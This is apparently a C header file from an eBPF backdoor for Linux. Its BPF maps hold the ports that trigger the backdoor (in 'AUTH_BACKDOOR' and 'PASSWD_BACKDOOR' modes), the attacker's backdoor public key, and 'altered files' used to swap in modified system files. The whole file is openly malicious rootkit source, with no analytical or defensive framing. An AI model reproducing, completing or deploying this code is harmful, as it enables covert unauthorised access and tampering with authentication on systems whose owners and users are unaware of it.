#pragma once
#include "vmlinux.h"
#include "backdoor.def.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

/*
    User defined variables
*/

// Ports to trigger backdoor
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8);
    __type(key, unsigned short);
    __type(value, int); // 1: AUTH_BACKDOOR, 2: PASSWD_BACKDOOR
} trigger_ports SEC(".maps");


/*
    Backdoor auth key
*/
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, int); // 0
    __type(value, char[256]); // backdoor public key
} auth_elem SEC(".maps");

/*
    altered files (holding our modified files)
*/
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 2);
    __type(key, int); // 0
    __type(value, struct file_block);
} files_elem SEC(".maps");